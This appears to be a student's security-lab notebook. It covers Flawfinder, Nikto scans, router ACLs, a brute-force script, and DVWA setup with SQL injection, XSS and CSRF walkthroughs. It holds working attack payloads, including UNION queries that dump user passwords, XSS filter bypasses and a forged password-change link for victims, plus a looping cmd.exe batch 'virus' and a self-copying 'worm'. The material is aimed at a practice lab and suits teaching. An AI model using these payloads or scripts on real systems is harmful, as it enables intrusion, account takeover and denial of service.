###########################################################################################
P1 Flawfinder
Os: Windows
CODE :
-------------------------------------------------
#include <stdio.h>
#include <string.h>
  
// Driver code
int main()
{
    char temp[100];
    char str[] = "hello";
    strcpy(temp, str);
    printf("%s", temp);
    return 0;
}
--------------------------------------------------------
pip install flawfinder
flawfinder <filepath>
###########################################################################################
p2 NIKTO
Os: Kali
--------------------------------------
nikto -help
nikto -host <URL>
nikto -host <IP>
nikto -host <URL> -output <filename>
ls
cat <filename>
nano ips.txt
nikto -host <ips.txt> -output <filename>
nikto -host <URL> -ssl
###########################################################################################
p3
-----------------------------------------------------
Drag drop router pt
Drag drop switch pt
add end devices
connect using thunder icon
assign IP
Routers-> 192.168.X.1
End devices-> 192.168.X.2/3/4/5
Inplace of default gateway and DNS server add router ip address of that network
power on serial port
assign IP address to ports

Add RIP (ALL network IPS)
192.168.1.0/2.0/3.0

ACL
go to CLI opposite of PC to be blocked
Command :
------------------------------------------------------------
access-list 11 deny 192.168.1.2 0.0.0.0
access-list 11 permit any
int fa0/0
ip access-group 11 out
ip access-group 11 in
###########################################################################################
p4
Bruteforce:
-------------------------------------------------------
from random import *

user_pass = input("Enter your password")

password = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j','k', 
            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't','u','v', 
            'w', 'x', 'y', 'z',]

guess = ""

count=0
while (guess != user_pass):
    guess = ""
    for letter in range(len(user_pass)):
        guess_letter = password[randint(0, 25)]
        guess = str(guess_letter) + str(guess)
    count+=1
    print(f'{count} ---> {guess}')
    
print("Your password : ",guess)
-----------------------------------------------------
VIRUS 1:
--------------------------------------------------------------
#worm to create copy of current file
import shutil

# Get the name of the current file
filename = file

# Get the number of copies to create
n = 10

# Create n copies of the file
for i in range(n):
  shutil.copy(filename, f"{filename}.copy{i+1}")
-----------------------------------------------------
VIRUS 2:
#open notepad add following :
-----------------------------------------
@ECHO off

:main

START %SystemRoot%\system32\cmd.exe

GOTO main
------------------------------------------
#Save as .bat file
###########################################################################################
p5
OS: Kali
#DVWA install
--------------------------------------------------------
cd /var/www/html

sudo git clone https://github.com/digininja/DVWA

sudo mv DVWA dvwa

sudo chmod -R 777 dvwa/

cd dvwa/config

sudo cp config.inc.php.dist config.inc.php

# Opening config file to change username and password
sudo nano config.inc.php
#make db_user to user and db_password to pass

# Save the file(Ctrl + O, then Enter) and Exit(Ctrl + X)
----------------------------------------------------------------
# Installing MySQL

sudo apt install default-mysql-server

# Configuring Mysql
sudo service mysql start

# Checking if the service is running or not
systemctl status mysql
# press q if your done checking

# Logging into mysql
sudo mysql -u root -p

# Creating new user in DVWA application config file
create user 'user'@'127.0.0.1' identified by 'pass';

# Granting all privilege over the dvwa database to our created user
grant all privileges on dvwa.* to 'user'@'127.0.0.1' identified by 'pass';
# use "exit" command to exit from mysql and return to terminal

# Installing PHP
sudo apt update
sudo apt -y install lsb-release apt-transport-https ca-certificates
sudo wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
echo "deb https://packages.sury.org/php/ buster main" | sudo tee /etc/apt/sources.list.d/php.list

# Installing php
sudo apt update
sudo apt install php7.4 -y

# Installing php extension
sudo apt install php7.4-{cli,json,imap,bcmath,bz2,intl,gd,mbstring,mysql,zip}
# line has error (viersion conflicts with different packages)

# Configure Apache Server
cd /etc/php/7.4/apache2

# Checking apache server
ls /etc/php

# Configure localhost server
sudo nano php.ini
#Scroll down and look for these two lines: allow_url_fopen and allow_url_include. 
#Set them both as On.

# Save the file(Ctrl + O, then Enter) and Exit(Ctrl + X)
--------------------------------------------------------------
# Starting Apache server
sudo service apache2 start

# To check if the service has started successfully
systemctl status apache2
#press q if you see acitve (running)
#That means your service is running properly

# Now access DVWA on your browser
#Open Browser and enter the link
# http://127.0.0.1/dvwa/

# Now click on create database on the bottom of the page
# A login window will open 
# username - "admin"
# password - "password"

# Go to DVWA Security and set it to high
# Then click to submit

# Go to SQL injection
# Double click on "Click here to change your ID"
---------------------------------------------------------
# Perform sql injection using
%'or'1'='1
%' or 0=0 union select null, user() #
%' or 0=0 union select null, version()#
info SCHEMA 
%' and 1=0 union select null, table_name from information_schema.tables #
 #columns fields in the information_schema user table
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
#Display Column field contents
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
#LINK : https://www.golinuxcloud.com/dvwa-sql-injection/
	https://www.golinuxcloud.com/install-dvwa-kali-linux/
----------------------------------------------------------
XSS
--------------------------------------------------------------------
# Implementing XSS (Cross-site Scripting) in kali using DVWA.

# To start apache2 server
sudo service apache2 start

# To check if apache2 server is running properly
systemctl status apache2
# if you see active (running)
# the server is running properly

# To start mysql server
sudo service mysql start

# To check if mysql server is running properly
systemctl status mysql
# if you see active (running)
# the server is running properly

# Now go to browser and user url
http://127.0.0.1/dvwa/

# If you are not directly prompted to login page try below steps

#scroll down and click on crete database
#if you see any errors on database connection
#possible solutions will be
#1. changing username and password of database in the config file
# this file will be in folder dvwa/config
# Opening config file to change username and password
#sudo nano config.inc.php
#make db_ser to user and db_password to pass

# Save the file(Ctrol + O, then Enter) and Exit(Ctrl + X)

# Once Databsae connection is successfull
# Log in using username: admin and password: password
-------------------------------------------------------------------
# Go to DVWA Security and set it to low

# Then go to XSS(REflected)
# In the name field you can enter js query which will be executed when we click on submit
script: <script>alert("Hello")</script>


# Now go to XSS (Stored)
# Enter Name and Message
# in message you will give js query
# once you click on submit guestbook your js query will be stored
# and it will be executed every time you visit that page
# you could clear all the entered query by clicking on clear guestbook
Name: CD
Message (script) : <script>alert("HELLO")</script>


# Now go to XSS (DOM)
# Choose a language and click on select
# url will be updated
# you can insert js query after ?default= in url which will be then executed once you press enter
# eg. 127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert("helooa")</script>
------------------------------------------------------------------------------
# Now again go to DVWA Security and change it to high
# Now the above queries will not be executed as the security is set to high
# so we need some different ways to fire our queries

# XSS (Reflected)
<img src=x onerror=alert("HELLO")>

# XSS (Stored)
# as the security is set high the query in the message box will not get executed
# so we can enter the query in name field 
# but the problem is name field has a limit of 10 character
# so we can bypass it by editing the html (ctrl + shift + I)
# Once Inspection is open chage maxlength to 100
<body onload=alert("HELLO")>

# XSS (DOM)
English#<script>alert("HELLO")</script>
--------------------------------------------------------------------------------
p6
--------------------------------------------------------------------------------
CSRF (Cross-site Request Forgery)

# Install burpsuite
sudo apt install burpsuite

# Open Burpsuite
burpsuite

# Accept all prompts, once burpsuite is on

# Go to Proxy > Intercept 
Turn Incerpt to off if it is on

#Click on Open Browser

# This is the browser provided by burpsuite on which we will try CSRF


#Once the browser is open enter the dvwa login url
127.0.0.1/dvwa/

# Enter username "admin" and password "password"

Set DVWA Security to low

Go to CSRF

# Go to burpsuite and turn Intercept to on
Once intercept is on it will capture all the requests sent by the victim

# Enter new password and confirm password then click on change

Burpsuite will open once you click on change you can see the generated url for changing 
password 
# We can use this url by sending it to someone else and once clicked by them the
password of their account will be changed by our specified one!

So now we can see the password entered by victim i.e "2001" on the first line
So as an hacker we can change the password and click on Intercept to off so it will 
send the given request from victims machine to the server

# Once you turn off Intercept the req will be sent and you will see password changed
# Note: you will use this password as your DVWA login password so remember it!

# So as we got the password change url we can copy it encode it and send it to different
user so that query will execute changing the password of their account
# As this url will be reflected to victim's machine we will encode the url
select the url and click (ctrl + u)

eg. 
# Generated Url
GET 127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change

# Encoded Url
GET /dvwa/vulnerabilities/csrf/?password_new%3dpassword%26password_conf%3dpassword%26Change%3dChange 
(Encoded url will be after "GET /dvwa/vulnerabilities/csrf/?")

###########################################################################################
p7 Backup database

-- Mysql login
mysql -u root -p

-- Create a Mysql backup
sudo mysqldump -u root -p <database_name> > bak.sql

-- Restore the stored Mysql backup
sudo mysql -u root -p <database_name> < bak.sql
###########################################################################################
p8

p9
Open Registry and call External to check
